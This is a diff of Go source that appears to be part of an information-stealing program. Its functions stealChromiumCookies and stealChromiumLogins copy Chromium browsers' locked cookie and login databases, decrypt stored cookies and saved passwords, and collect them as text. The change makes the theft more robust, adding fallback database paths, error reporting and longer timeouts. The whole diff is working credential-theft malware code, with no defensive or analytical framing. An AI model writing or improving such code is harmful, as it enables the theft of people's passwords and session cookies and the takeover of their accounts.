@@ -166,6 +166,7 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_ck_%s_%s_%d", browserName, strings.ReplaceAll(profile, " ", ""), time.Now().UnixNano()))
 		copyOk := false
+		var copyErr error
 		if err := copyFileLocked(cookiePath, tmpPath, browserExe); err == nil {
 			if info, serr := os.Stat(tmpPath); serr == nil && info.Size() > 0 {
 				_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", browserExe)
@@ -173,61 +174,75 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 				copyOk = true
 			} else {
 				os.Remove(tmpPath)
+				copyErr = fmt.Errorf("copied but empty")
 			}
+		} else {
+			copyErr = err
 		}
 
-		var dsn string
+		// Build list of DSNs to try in order
+		var dsnList []string
 		if copyOk {
-			dsn = tmpPath
+			dsnList = append(dsnList, tmpPath)
 			defer os.Remove(tmpPath)
 			defer os.Remove(tmpPath + "-wal")
 			defer os.Remove(tmpPath + "-shm")
-		} else {
-			clean := strings.ReplaceAll(cookiePath, "\\", "/")
-			dsn = "file:" + clean + "?mode=ro&immutable=1"
 		}
+		// Always try original path directly as fallback
+		dsnList = append(dsnList, cookiePath)
 
 		type queryResult struct {
 			cookies string
 			err     string
 		}
 		ch := make(chan queryResult, 1)
-		go func(openDSN, bName, prof string) {
-			db, err := sql.Open("sqlite", openDSN)
-			if err != nil {
-				ch <- queryResult{"", fmt.Sprintf("%s/%s open: %v", bName, prof, err)}
-				return
-			}
-			defer db.Close()
-			db.Exec("PRAGMA busy_timeout = 10000")
-			db.Exec("PRAGMA journal_mode = OFF")
-
-			rows, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
-			if err != nil {
-				ch <- queryResult{"", fmt.Sprintf("%s/%s query: %v", bName, prof, err)}
-				return
-			}
-			defer rows.Close()
-
-			var buf strings.Builder
-			rowCount := 0
-			for rows.Next() {
-				var host, name, path string
-				var encValue []byte
-				var expires int64
-				if err := rows.Scan(&host, &name, &path, &encValue, &expires); err != nil {
+		go func(dsns []string, bName, prof string, cpErr error) {
+			var lastErr string
+			for _, dsn := range dsns {
+				db, err := sql.Open("sqlite", dsn)
+				if err != nil {
+					lastErr = fmt.Sprintf("%s/%s open(%s): %v", bName, prof, filepath.Base(dsn), err)
 					continue
 				}
-				rowCount++
-				value := decryptCookieValue(encValue, userDataPath)
-				buf.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%d\n", host, name, value, path, expires))
+
+				db.Exec("PRAGMA busy_timeout = 10000")
+				db.Exec("PRAGMA journal_mode = OFF")
+				db.Exec("PRAGMA locking_mode = NORMAL")
+
+				rows, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
+				if err != nil {
+					lastErr = fmt.Sprintf("%s/%s query(%s): %v", bName, prof, filepath.Base(dsn), err)
+					db.Close()
+					continue
+				}
+
+				var buf strings.Builder
+				rowCount := 0
+				for rows.Next() {
+					var host, name, path string
+					var encValue []byte
+					var expires int64
+					if err := rows.Scan(&host, &name, &path, &encValue, &expires); err != nil {
+						continue
+					}
+					rowCount++
+					value := decryptCookieValue(encValue, userDataPath)
+					buf.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%d\n", host, name, value, path, expires))
+				}
+				rows.Close()
+				db.Close()
+
+				if rowCount > 0 {
+					ch <- queryResult{buf.String(), ""}
+					return
+				}
+				lastErr = fmt.Sprintf("%s/%s: 0 rows (%s)", bName, prof, filepath.Base(dsn))
 			}
-			if rowCount == 0 {
-				ch <- queryResult{"", fmt.Sprintf("%s/%s: 0 rows", bName, prof)}
-				return
+			if cpErr != nil {
+				lastErr += " copy:" + cpErr.Error()
 			}
-			ch <- queryResult{buf.String(), ""}
-		}(dsn, browserName, profile)
+			ch <- queryResult{"", lastErr}
+		}(dsnList, browserName, profile, copyErr)
 
 		select {
 		case res := <-ch:
@@ -237,7 +252,7 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 			if res.cookies != "" {
 				allCookies.WriteString(res.cookies)
 			}
-		case <-time.After(15 * time.Second):
+		case <-time.After(20 * time.Second):
 			errs = append(errs, fmt.Sprintf("%s/%s: timeout", browserName, profile))
 		}
 	}
@@ -265,58 +280,63 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 			}
 		}
 
-		var dsn string
+		var dsnList []string
 		if copyOk {
-			dsn = tmpPath
+			dsnList = append(dsnList, tmpPath)
 			defer os.Remove(tmpPath)
-		} else {
-			clean := strings.ReplaceAll(loginPath, "\\", "/")
-			dsn = "file:" + clean + "?mode=ro&immutable=1"
 		}
+		dsnList = append(dsnList, loginPath)
 
 		ch := make(chan string, 1)
-		go func(openDSN string) {
-			db, err := sql.Open("sqlite", openDSN)
-			if err != nil {
-				ch <- ""
-				return
-			}
-			defer db.Close()
-			db.Exec("PRAGMA busy_timeout = 10000")
-			db.Exec("PRAGMA journal_mode = OFF")
+		go func(dsns []string) {
+			for _, dsn := range dsns {
+				db, err := sql.Open("sqlite", dsn)
+				if err != nil {
+					continue
+				}
+				db.Exec("PRAGMA busy_timeout = 10000")
+				db.Exec("PRAGMA journal_mode = OFF")
+				db.Exec("PRAGMA locking_mode = NORMAL")
 
-			rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
-			if err != nil {
-				ch <- ""
-				return
-			}
-			defer rows.Close()
+				rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
+				if err != nil {
+					db.Close()
+					continue
+				}
 
-			var buf strings.Builder
-			for rows.Next() {
-				var url, username string
-				var encPassword []byte
-				if err := rows.Scan(&url, &username, &encPassword); err != nil {
-					continue
+				var buf strings.Builder
+				for rows.Next() {
+					var url, username string
+					var encPassword []byte
+					if err := rows.Scan(&url, &username, &encPassword); err != nil {
+						continue
+					}
+					if username == "" {
+						continue
+					}
+					password := decryptCookieValue(encPassword, userDataPath)
+					if password == "" || password == "(encrypted)" {
+						continue
+					}
+					buf.WriteString(fmt.Sprintf("URL: %s\nLogin: %s\nPassword: %s\n\n", url, username, password))
 				}
-				if username == "" {
-					continue
+				rows.Close()
+				db.Close()
+
+				if buf.Len() > 0 {
+					ch <- buf.String()
+					return
 				}
-				password := decryptCookieValue(encPassword, userDataPath)
-				if password == "" || password == "(encrypted)" {
-					continue
-				}
-				buf.WriteString(fmt.Sprintf("URL: %s\nLogin: %s\nPassword: %s\n\n", url, username, password))
 			}
-			ch <- buf.String()
-		}(dsn)
+			ch <- ""
+		}(dsnList)
 
 		select {
 		case res := <-ch:
 			if res != "" {
 				sb.WriteString(res)
 			}
-		case <-time.After(15 * time.Second):
+		case <-time.After(20 * time.Second):
 		}
 	}
 	return sb.String()
